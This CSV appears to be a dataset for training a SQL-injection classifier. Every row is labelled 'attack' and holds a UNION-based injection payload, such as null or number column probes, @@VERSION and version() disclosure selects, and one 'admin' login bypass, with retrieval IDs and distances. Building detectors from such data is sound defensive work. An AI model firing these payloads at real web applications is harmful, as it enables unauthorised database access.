id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_001445,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000056,0.09304316634086598
SMOTE_001446,attack,union,"1%'   )    )    union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000105,0.15194439724615227
SMOTE_001447,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000034,0.9946856513564118
SMOTE_001448,attack,union,"1 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000152,0.9132841677157388
SMOTE_001449,attack,union," select * from users where id  =  '1' union select +\#,@@VERSION -- 1'",nearest_attack_euclidean,R000022,0.8645733393283158
SMOTE_001450,attack,union,"-4635"" union all select 5087,5087,5087,5087,5087,5087,5087,5087,5087,5087#",nearest_attack_euclidean,R000072,0.7903165597257795
SMOTE_001451,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000120,1.7259728630519335
SMOTE_001452,attack,union,"-6587'  )   union all select 6349,6349,6349,6349,6349,6349,6349,6349,6349,6349--",nearest_attack_euclidean,R000133,0.6928177846455026
SMOTE_001453,attack,union,"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",nearest_attack_euclidean,R000091,0.09790021587858735
SMOTE_001454,attack,union,"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",nearest_attack_euclidean,R000048,1.4288791397824723
SMOTE_001455,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,0.5363299150645333
SMOTE_001456,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000101,0.13898477958930539
SMOTE_001457,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000077,0.9051853782045894
SMOTE_001458,attack,union,"-9050 union all select 9346,9346,9346,9346,9346,9346,9346,9346,9346,9346--",nearest_attack_euclidean,R000070,0.33279244058127344
SMOTE_001459,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000120,1.108717356271788
SMOTE_001460,attack,union,"-3790""  )   as ojgb where 5925  =  5925 union all select 5925,5925#",nearest_attack_euclidean,R000066,0.39159475837889635
SMOTE_001461,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000049,0.6315671240353634
SMOTE_001462,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000089,0.30733836094360195
SMOTE_001463,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000076,0.9130945897250982
SMOTE_001464,attack,union," select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000013,2.603165687511982
SMOTE_001465,attack,union,"-6405  )   as ilah where 5145  =  5145 union all select 5145,5145,5145,5145,5145--",nearest_attack_euclidean,R000108,1.2650410971164456
SMOTE_001466,attack,union,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",nearest_attack_euclidean,R000030,0.8927460067143632
SMOTE_001467,attack,union,"1'+  (  select 'eoxk' where 6621  =  6621 union all select null,null#",nearest_attack_euclidean,R000085,0.7688550839014945
SMOTE_001468,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000116,0.6182018908464977
SMOTE_001469,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000056,0.08168181075802511
SMOTE_001470,attack,union,"1""  )   where 2088  =  2088 union all select null,null,null,null--",nearest_attack_euclidean,R000096,0.4997313303130432
SMOTE_001471,attack,union," select * from users where id  =  1.*\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000027,0.05587194328720667
SMOTE_001472,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000101,1.227216821264699
SMOTE_001473,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,0.7366181220433374
SMOTE_001474,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000101,1.3477760637378227
SMOTE_001475,attack,union," select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000007,1.2448459962647975
SMOTE_001476,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000026,1.0520832682045478
SMOTE_001477,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000049,1.0188750052584103
SMOTE_001478,attack,union," select * from users where id  =  11<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000012,0.6354099233002861
SMOTE_001479,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000010,0.30535004723045295
SMOTE_001480,attack,union,-4965  )   as imga where 3705  =  3705 union all select 3705--,nearest_attack_euclidean,R000122,0.9063582505658473
SMOTE_001481,attack,union,"-6593""  )   union all select 6216,6216,6216,6216,6216,6216,6216#",nearest_attack_euclidean,R000055,0.002829136224838781
SMOTE_001482,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000104,0.20491237282607752
SMOTE_001483,attack,union,"1""   )    )    as mlid where 1047  =  1047 union all select null,null#",nearest_attack_euclidean,R000040,1.3268503169443233
SMOTE_001484,attack,union,"-9136%""  )   union all select 3081,3081,3081,3081,3081,3081,3081#",nearest_attack_euclidean,R000151,0.37875231258499586
SMOTE_001485,attack,union,"-4802 union all select 7381,7381,7381,7381,7381,7381,7381,7381,7381,7381--",nearest_attack_euclidean,R000114,0.43186910362385167
SMOTE_001486,attack,union," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000010,0.13717046570498284
SMOTE_001487,attack,union,"-9050 union all select 9346,9346,9346,9346,9346,9346,9346,9346,9346,9346--",nearest_attack_euclidean,R000070,0.05182391702271544
SMOTE_001488,attack,union,"1' where 2774  =  2774 union all select null,null,null,null,null#",nearest_attack_euclidean,R000112,0.9877779845241943
SMOTE_001489,attack,union,"-9163"" union all select 3820,3820,3820,3820,3820,3820,3820,3820,3820#",nearest_attack_euclidean,R000140,0.42806052675164014
SMOTE_001490,attack,union," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000025,0.987324137558575
SMOTE_001491,attack,union,"-6075' union all select 9988,9988,9988,9988,9988,9988,9988,9988,9988#",nearest_attack_euclidean,R000145,0.12932207065733112
SMOTE_001492,attack,union,"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",nearest_attack_euclidean,R000090,0.41516417284153073
SMOTE_001493,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R000119,1.358831876320785
SMOTE_001494,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000084,0.5735961420087875
SMOTE_001495,attack,union,"1""   )    )     )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000068,1.3149101252136153
SMOTE_001496,attack,union,"-6593""  )   union all select 6216,6216,6216,6216,6216,6216,6216#",nearest_attack_euclidean,R000055,0.5062298607084663
SMOTE_001497,attack,union,"-8308""  )   union all select 3084,3084,3084,3084,3084,3084,3084,3084,3084#",nearest_attack_euclidean,R000135,0.338965392935524
SMOTE_001498,attack,union,"1' union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000098,1.4830483135633965
SMOTE_001499,attack,union,"1'+  (  select vlut where 9517  =  9517 union all select null,null,null--",nearest_attack_euclidean,R000045,1.948242094696032
SMOTE_001500,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000034,0.012301579045565579
SMOTE_001501,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000095,0.43677729010651856
SMOTE_001502,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000034,0.4521085416785679
SMOTE_001503,attack,union,"-2207%'   )    )    union all select 3339,3339,3339,3339,3339,3339#",nearest_attack_euclidean,R000143,0.4398832245499059
SMOTE_001504,attack,union,-4965  )   as imga where 3705  =  3705 union all select 3705--,nearest_attack_euclidean,R000122,0.8348618470960684
SMOTE_001505,attack,union," select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000016,0.10365754860898137
SMOTE_001506,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000076,1.2772830874314143
SMOTE_001507,attack,union,"1%'   )    )    union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000105,1.5795665569428718
SMOTE_001508,attack,union," select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000007,0.2688518541068264
SMOTE_001509,attack,union,"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",nearest_attack_euclidean,R000004,2.5693099983502257
SMOTE_001510,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000078,1.0854123119223114
SMOTE_001511,attack,union,"-7460"" union all select 4273,4273,4273,4273,4273,4273,4273,4273#",nearest_attack_euclidean,R000060,0.47793647189630434
SMOTE_001512,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,0.11543282398499113
SMOTE_001513,attack,union,"-8073   )    )     )   union all select 4481,4481,4481,4481--",nearest_attack_euclidean,R000116,1.4480399836224895
SMOTE_001514,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000051,0.23457558060076897
SMOTE_001515,attack,union,"1'+  (  select lang where 4191  =  4191 union all select null,null#",nearest_attack_euclidean,R000097,0.3248921383807059
SMOTE_001516,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000026,3.26306818624666
SMOTE_001517,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000018,0.7205407882924443
SMOTE_001518,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000104,0.23187228148256972
SMOTE_001519,attack,union,"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",nearest_attack_euclidean,R000067,0.09957288025104713
SMOTE_001520,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000026,3.591249439719636
SMOTE_001521,attack,union," select * from users where id  =  1 union select @&&@,version  (    )   -- 1",nearest_attack_euclidean,R000028,1.895632353956999
SMOTE_001522,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000154,0.4025588349476678
SMOTE_001523,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000051,0.45134367724647806
SMOTE_001524,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000026,0.22878578414596368
SMOTE_001525,attack,union,"-9958""  )   as jzvq where 3741  =  3741 union all select 3741,3741,3741#",nearest_attack_euclidean,R000033,5.283608794242803
SMOTE_001526,attack,union,"-2639""  )   where 1494  =  1494 union all select 1494--",nearest_attack_euclidean,R000083,0.30925472915563806
SMOTE_001527,attack,union,"1'+  (  select lang where 4191  =  4191 union all select null,null#",nearest_attack_euclidean,R000097,1.5601567728110715
SMOTE_001528,attack,union,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",nearest_attack_euclidean,R000147,0.06533780681778358
SMOTE_001529,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000009,0.5441603577595017
SMOTE_001530,attack,union,"1%'   )    )    union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000105,1.0661263071496963
SMOTE_001531,attack,union,"1%""   )    )    union all select null,null,null,null,null--",nearest_attack_euclidean,R000124,0.4417983732233504
SMOTE_001532,attack,union," select * from users where id  =  11<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000012,1.0418610276661364
SMOTE_001533,attack,union,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",nearest_attack_euclidean,R000147,0.12443234279359959
SMOTE_001534,attack,union," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000025,0.7848007126794185
SMOTE_001535,attack,union,"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",nearest_attack_euclidean,R000091,0.460272125989214
SMOTE_001536,attack,union," select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000016,0.41201610621839524
SMOTE_001537,attack,union," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000018,0.8920359794738635
SMOTE_001538,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000037,1.2270951411393611
SMOTE_001539,attack,union,"1  )   as ghew where 6441  =  6441 union all select null,null--",nearest_attack_euclidean,R000032,0.3666183463255689
SMOTE_001540,attack,union,"-4711%""   )    )    union all select 6737,6737,6737,6737#",nearest_attack_euclidean,R000150,0.048494920008902036
SMOTE_001541,attack,union,"1 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000152,0.06594673404092256
SMOTE_001542,attack,union,"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",nearest_attack_euclidean,R000091,0.3415282375184983
SMOTE_001543,attack,union,"-6770'   )    )    union all select 1845,1845,1845,1845,1845,1845,1845,1845,1845#",nearest_attack_euclidean,R000121,0.3454561828362942
SMOTE_001544,attack,union,"-6587'  )   union all select 6349,6349,6349,6349,6349,6349,6349,6349,6349,6349--",nearest_attack_euclidean,R000133,0.5980234257672836
SMOTE_001545,attack,union,"-9532   )    )    union all select 6039,6039,6039,6039--",nearest_attack_euclidean,R000042,0.13661084493079598
SMOTE_001546,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000026,1.4832270970006927
SMOTE_001547,attack,union,"-4711%""   )    )    union all select 6737,6737,6737,6737#",nearest_attack_euclidean,R000150,0.2676990053297013
SMOTE_001548,attack,union,"1'  )   as hats where 2011  =  2011 union all select null,null,null,null,null#",nearest_attack_euclidean,R000051,0.5350796449339805
SMOTE_001549,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000024,0.7700067094219845
SMOTE_001550,attack,union," select * from users where id  =  1.<1# union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000017,0.39523151419663777
SMOTE_001551,attack,union,"1%'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000044,0.9262304047511448
SMOTE_001552,attack,union,"-1550' in boolean mode  )   union all select 9777,9777,9777--",nearest_attack_euclidean,R000120,0.048512498824451154
SMOTE_001553,attack,union,1'  )   as gogu where 4338  =  4338 union all select null#,nearest_attack_euclidean,R000074,0.7142391015458401
SMOTE_001554,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000029,0.9033967004411689
SMOTE_001555,attack,union,"1  )   as ghew where 6441  =  6441 union all select null,null--",nearest_attack_euclidean,R000032,0.766110338924541
SMOTE_001556,attack,union,"1""  )   where 5870  =  5870 union all select null,null,null--",nearest_attack_euclidean,R000111,0.16143691261240545
SMOTE_001557,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000084,0.5479662173504072
SMOTE_001558,attack,union,"-2625""   )    )    as qfuo where 1980  =  1980 union all select 1980,1980,1980--",nearest_attack_euclidean,R000148,0.35154481078788175
SMOTE_001559,attack,union,"-5528'  )   union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#",nearest_attack_euclidean,R000064,0.0811417980821172
SMOTE_001560,attack,union,"1""  )   as boeh where 2571  =  2571 union all select null#",nearest_attack_euclidean,R000100,0.7052573464810995
SMOTE_001561,attack,union,"-9966'   )    )    union all select 7230,7230,7230,7230,7230,7230,7230#",nearest_attack_euclidean,R000088,1.0210781359988657
SMOTE_001562,attack,union,"1  )   as ghew where 6441  =  6441 union all select null,null--",nearest_attack_euclidean,R000032,0.7561525125620376
SMOTE_001563,attack,union,"1""  )   as boeh where 2571  =  2571 union all select null#",nearest_attack_euclidean,R000100,0.4546656679232046
SMOTE_001564,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,0.8027799731953841
SMOTE_001565,attack,union,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",nearest_attack_euclidean,R000104,0.4822540921420718
SMOTE_001566,attack,union,"1 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000046,1.062926817557306
SMOTE_001567,attack,union,"1'   )    )    union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000031,1.2645992834882458
SMOTE_001568,attack,union,-3666'  )   where 6386  =  6386 union all select 6386--,nearest_attack_euclidean,R000093,0.6351810030118862
SMOTE_001569,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000041,0.017721758216214842
SMOTE_001570,attack,union,"1'  )   where 5925  =  5925 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000126,1.1003881918190257
SMOTE_001571,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,1.3934730206597545
SMOTE_001572,attack,union,"-8651""  )   where 8391  =  8391 union all select 8391,8391#",nearest_attack_euclidean,R000087,1.4495936821629356
SMOTE_001573,attack,union,"1  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000034,0.1109681828288764
SMOTE_001574,attack,union,"1""  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000075,1.4737444048209658
SMOTE_001575,attack,union,"1   )    )     )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000053,0.04501057798003879
SMOTE_001576,attack,union," select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000009,0.8250401144125492
SMOTE_001577,attack,union," select * from users where id  =  1. union select null,version  (    )   -- 1",nearest_attack_euclidean,R000019,0.7824697969424523
SMOTE_001578,attack,union," select * from users where id  =  1. union select null,version  (    )   -- 1",nearest_attack_euclidean,R000019,0.12121657651663859
SMOTE_001579,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000049,1.0924823757139175
SMOTE_001580,attack,union,"1'+  (  select lang where 4191  =  4191 union all select null,null#",nearest_attack_euclidean,R000097,0.2088163751343746
SMOTE_001581,attack,union,"-2639""  )   where 1494  =  1494 union all select 1494--",nearest_attack_euclidean,R000083,1.4502713671781133
SMOTE_001582,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R000119,0.5556779110566504
SMOTE_001583,attack,union,"1""  )   where 5870  =  5870 union all select null,null,null--",nearest_attack_euclidean,R000111,0.5970396275541651
SMOTE_001584,attack,union,"1   )    )    union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000154,1.1363247653751576
SMOTE_001585,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000049,0.09902005918345075
SMOTE_001586,attack,union,"-7460"" union all select 4273,4273,4273,4273,4273,4273,4273,4273#",nearest_attack_euclidean,R000060,0.08323713904712633
SMOTE_001587,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000041,0.200706731767817
SMOTE_001588,attack,union,"1'  )   union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000058,0.5106684365049506
SMOTE_001589,attack,union,"-4635"" union all select 5087,5087,5087,5087,5087,5087,5087,5087,5087,5087#",nearest_attack_euclidean,R000072,0.4719269484584315
SMOTE_001590,attack,union,"-9163"" union all select 3820,3820,3820,3820,3820,3820,3820,3820,3820#",nearest_attack_euclidean,R000140,0.09275488246860317
SMOTE_001591,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R000101,0.41968372408465215
SMOTE_001592,attack,union," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",nearest_attack_euclidean,R000011,0.19015540222308133
SMOTE_001593,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,0.45070391378585994
SMOTE_001594,attack,union,"-6075' union all select 9988,9988,9988,9988,9988,9988,9988,9988,9988#",nearest_attack_euclidean,R000145,0.355079915211251
SMOTE_001595,attack,union," select * from users where id  =  1 union select @&&@,version  (    )   -- 1",nearest_attack_euclidean,R000028,0.30238136708079294
SMOTE_001596,attack,union,"-6593""  )   union all select 6216,6216,6216,6216,6216,6216,6216#",nearest_attack_euclidean,R000055,0.06109288453829018
SMOTE_001597,attack,union,"1%' union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000047,1.3411602226031534
SMOTE_001598,attack,union,"1'  )   union all select null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000084,0.17293415745624152
SMOTE_001599,attack,union,"1'  )   where 8268  =  8268 union all select null,null,null,null--",nearest_attack_euclidean,R000125,0.8853299885153538
SMOTE_001600,attack,union," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",nearest_attack_euclidean,R000026,0.2362171542938301
SMOTE_001601,attack,union,"-4230""   )    )     )   union all select 6962,6962,6962,6962,6962,6962#",nearest_attack_euclidean,R000106,0.47328185385215177
SMOTE_001602,attack,union,"-6667%""   )    )    union all select 7348,7348,7348,7348,7348,7348,7348,7348#",nearest_attack_euclidean,R000054,0.7313949799207599
SMOTE_001603,attack,union,"1%' union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000063,1.3332497723577292
SMOTE_001604,attack,union,"-3781%'  )   union all select 7497,7497,7497,7497,7497--",nearest_attack_euclidean,R000132,1.0305136224682765
SMOTE_001605,attack,union,"-4589""  )   union all select 1441,1441,1441,1441,1441,1441,1441,1441,1441,1441--",nearest_attack_euclidean,R000065,0.7179608464261968
SMOTE_001606,attack,union,"-9050 union all select 9346,9346,9346,9346,9346,9346,9346,9346,9346,9346--",nearest_attack_euclidean,R000070,0.13461119771663138
SMOTE_001607,attack,union,"1' where 2774  =  2774 union all select null,null,null,null,null#",nearest_attack_euclidean,R000112,0.03868713279692147
SMOTE_001608,attack,union,"1%' union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000063,0.07936243022963126
SMOTE_001609,attack,union,"-6075' union all select 9988,9988,9988,9988,9988,9988,9988,9988,9988#",nearest_attack_euclidean,R000145,0.3600510888192211
SMOTE_001610,attack,union,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",nearest_attack_euclidean,R000036,0.7562639805946356
SMOTE_001611,attack,union,"1'   )    )     )   union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000077,0.7065454612841734
SMOTE_001612,attack,union," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",nearest_attack_euclidean,R000024,0.3208217063140694
SMOTE_001613,attack,union,"1'  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000041,0.4363313492733832
SMOTE_001614,attack,union," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000025,0.7172688384218969
SMOTE_001615,attack,union,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",nearest_attack_euclidean,R000037,1.077272871556307
SMOTE_001616,attack,union,"-6587'  )   union all select 6349,6349,6349,6349,6349,6349,6349,6349,6349,6349--",nearest_attack_euclidean,R000133,1.4213581227245564
SMOTE_001617,attack,union,"-8609%""   )    )     )   union all select 6021,6021,6021,6021,6021,6021--",nearest_attack_euclidean,R000156,0.46133074015221476
SMOTE_001618,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000049,0.8398759594685666
SMOTE_001619,attack,union," select * from users where id  =  '1' %!<@ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000001,0.006814802365584129
SMOTE_001620,attack,union,"1  )   as ghew where 6441  =  6441 union all select null,null--",nearest_attack_euclidean,R000032,0.547945360433567
SMOTE_001621,attack,union,"-8651""  )   where 8391  =  8391 union all select 8391,8391#",nearest_attack_euclidean,R000087,0.10513845386269526
SMOTE_001622,attack,union,"-8117' union all select 9945,9945,9945,9945,9945,9945,9945#",nearest_attack_euclidean,R000081,0.0
SMOTE_001623,attack,union," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000025,0.6772914995243058
SMOTE_001624,attack,union,"-3378%""   )    )    union all select 9357,9357,9357,9357,9357--",nearest_attack_euclidean,R000118,1.7372594276834032
SMOTE_001625,attack,union,"1%' union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000063,0.5494682361099552
SMOTE_001626,attack,union,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",nearest_attack_euclidean,R000043,1.4511367872303178
SMOTE_001627,attack,union,"-6294"" union all select 9921,9921,9921,9921,9921,9921--",nearest_attack_euclidean,R000095,1.2439559467334256
SMOTE_001628,attack,union," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000008,0.06878626788803369
SMOTE_001629,attack,union,-4965  )   as imga where 3705  =  3705 union all select 3705--,nearest_attack_euclidean,R000122,0.1143697596552298
SMOTE_001630,attack,union,"-9136%""  )   union all select 3081,3081,3081,3081,3081,3081,3081#",nearest_attack_euclidean,R000151,0.644229471214314
SMOTE_001631,attack,union,"1'+  (  select lang where 4191  =  4191 union all select null,null#",nearest_attack_euclidean,R000097,0.39256353260066135
SMOTE_001632,attack,union,-3666'  )   where 6386  =  6386 union all select 6386--,nearest_attack_euclidean,R000093,1.2176140880135975
SMOTE_001633,attack,union," select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000006,0.04301333520101501
SMOTE_001634,attack,union,"1%'   )    )    union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000131,1.270104586629579
SMOTE_001635,attack,union," select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000008,0.8443619592727882
SMOTE_001636,attack,union," select * from users where id  =  1.*\ union select null,@@VERSION -- 1",nearest_attack_euclidean,R000027,0.11288818876148601
SMOTE_001637,attack,union,"1""   )    )    as mlid where 1047  =  1047 union all select null,null#",nearest_attack_euclidean,R000040,0.06423455343945916
SMOTE_001638,attack,union,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000078,1.8935410485213284
SMOTE_001639,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000049,0.2956462467184971
SMOTE_001640,attack,union,"-3300' union all select 8979,8979,8979,8979,8979,8979--",nearest_attack_euclidean,R000134,0.5023343096573293
SMOTE_001641,attack,union,"1   )    )     )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000053,1.480258644382031
SMOTE_001642,attack,union,"1  )   where 1443  =  1443 union all select null,null,null,null,null#",nearest_attack_euclidean,R000038,0.4119352892152951
